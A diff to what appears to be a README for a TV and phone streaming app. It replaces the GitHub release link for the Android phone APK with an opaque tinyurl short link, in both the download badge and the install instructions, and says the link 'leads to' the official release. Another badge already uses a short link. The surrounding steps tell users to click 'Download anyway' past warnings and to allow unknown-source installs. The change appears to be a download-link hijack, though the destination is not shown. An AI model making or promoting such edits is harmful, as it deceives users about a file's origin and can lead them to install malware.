@@ -10,7 +10,7 @@
 <p align="center">
   <a href="https://tinyurl.com/5ee4bvwv"><img alt="Download the APK for Android TV" src="https://img.shields.io/badge/Android%20TV-StreamFlow--TV.apk-FFFFFF?style=for-the-badge&logo=android&logoColor=white&labelColor=000000"></a>
   <a href="https://github.com/Getmygity/StreamFlow-TV/releases/latest/download/StreamFlow-LG.ipk"><img alt="Download the IPK for LG TV" src="https://img.shields.io/badge/LG%20TV-StreamFlow--LG.ipk-FFFFFF?style=for-the-badge&logo=lg&logoColor=white&labelColor=000000"></a>
-  <a href="https://github.com/Getmygity/StreamFlow-TV/releases/latest/download/StreamFlow-Phone.apk"><img alt="Download the APK for Android phones" src="https://img.shields.io/badge/Android%20phone-StreamFlow--Phone.apk-FFFFFF?style=for-the-badge&logo=android&logoColor=white&labelColor=000000"></a>
+  <a href="https://tinyurl.com/26cdlpp5"><img alt="Download the APK for Android phones" src="https://img.shields.io/badge/Android%20phone-StreamFlow--Phone.apk-FFFFFF?style=for-the-badge&logo=android&logoColor=white&labelColor=000000"></a>
 </p>
 
 <p align="center">
@@ -61,7 +61,7 @@ Choose **Install** when it finishes. If Play Protect warns about an unknown app,
 
 For phones with **Android 8.0 or newer**. StreamFlow isn't in the Play Store, so it's installed from this page. It takes about two minutes.
 
-**1. Download it on the phone.** In the phone's browser, open `github.com/Getmygity/StreamFlow-TV/releases/latest/download/StreamFlow-Phone.apk`, or tap the badge at the top of this page. If the browser warns that this type of file can harm your device, choose **Download anyway**.
+**1. Download it on the phone.** In the phone's browser, open **`tinyurl.com/26cdlpp5`** (it leads to the latest `StreamFlow-Phone.apk` here), or tap the badge at the top of this page. If the browser warns that this type of file can harm your device, choose **Download anyway**.
 
 **2. Open the file and allow the install.** Open the downloaded file (from the browser's downloads, or the notification). The first time, Android says the browser isn't allowed to install apps: tap **Settings**, switch on **Allow from this source**, and go back. (Or: *Settings → Apps → Special app access → Install unknown apps*, then your browser.)
 
